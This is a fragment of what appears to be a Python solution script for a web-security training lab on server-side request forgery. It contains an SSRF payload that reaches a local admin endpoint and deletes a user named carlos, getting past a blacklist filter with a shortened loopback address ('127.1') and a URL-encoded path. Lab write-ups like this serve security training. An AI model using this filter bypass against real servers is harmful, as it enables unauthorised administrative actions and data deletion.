...
def delete_user(s, url):
    ...
    del_user_payload = 'http://127.1/%61dmin/delete?username=carlos'
...
def main():
	...
	print("\033[36m[+] SSRF with blacklist-based input filter deleting carlos user...")
